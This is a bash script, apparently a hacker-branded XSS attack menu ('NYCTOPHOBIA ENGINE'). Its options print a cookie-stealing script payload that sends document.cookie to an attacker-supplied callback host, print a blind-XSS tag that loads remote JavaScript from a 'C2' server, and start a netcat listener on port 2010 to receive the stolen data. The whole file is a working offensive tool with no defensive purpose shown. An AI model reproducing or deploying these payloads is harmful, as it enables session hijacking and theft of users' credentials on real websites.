#!/usr/bin/env bash
C='\033[0;36m'; W='\033[1;37m'; R='\033[0;31m'; Y='\033[1;33m'; G='\033[0;32m'; N='\033[0m'

while true; do
    clear
    echo -e "${C}==================================================${N}"
    echo -e "${W}             NYCTOPHOBIA ENGINE${N}"
    echo -e "${W}             By Bogor X Ploit${N}"
    echo -e "${C}==================================================${N}"
    echo ""

    echo -e "${G}[1]${N} Initiate Basic Session Hook"
    echo -e "${G}[2]${N} Deploy Blind Injection Vector"
    echo -e "${G}[3]${N} Start Data Exfiltration Listener"
    echo -e "${G}[4]${N} Back to Main Menu"
    echo -e "${C}--------------------------------------------------${N}"

    echo -ne "${Y}Select option > ${N}"
    read -r xss_choice

    case "$xss_choice" in
        1)
            echo -ne "${Y}Enter Target URL > ${N}"
            read -r target
            echo -ne "${Y}Enter Callback IP > ${N}"
            read -r callback_url
            
            echo -e "${G}[+] Initializing Session Hook...${N}"
            sleep 1
            
            RAW_PAYLOAD="<script>new Image().src='http://${callback_url}:2010/?c='+document.cookie;</script>"
            
            echo -e "${W}Raw Vector:${N} $RAW_PAYLOAD"
            echo ""
            read -p "Press Enter to continue..."
            ;;
        2)
            echo -ne "${Y}Enter Your C2 Receiver URL > ${N}"
            read -r c2_url
            echo -e "${G}[+] Deploying Blind Vector...${N}"
            sleep 1
            
            PAYLOAD="<script src=\"http://${c2_url}:2010/blind.js\"></script>"
            echo -e "${W}Vector:${N} $PAYLOAD"
            echo ""
            read -p "Press Enter to continue..."
            ;;
        3)
            echo -e "${G}[+] Starting Data Exfiltration Listener on port 2010...${N}"
            echo -e "${Y}[!] Waiting for incoming sessions... (Press CTRL+C to stop)${N}"
            
            if command -v nc >/dev/null 2>&1; then
                nc -lvnp 2010
            elif command -v ncat >/dev/null 2>&1; then
                ncat -lvnp 2010
            fi
            echo ""
            read -p "Press Enter to continue..."
            ;;
        4) exit 0 ;;
        *) echo -e "${R}[!] Invalid choice.${N}"; sleep 1 ;;
    esac
done
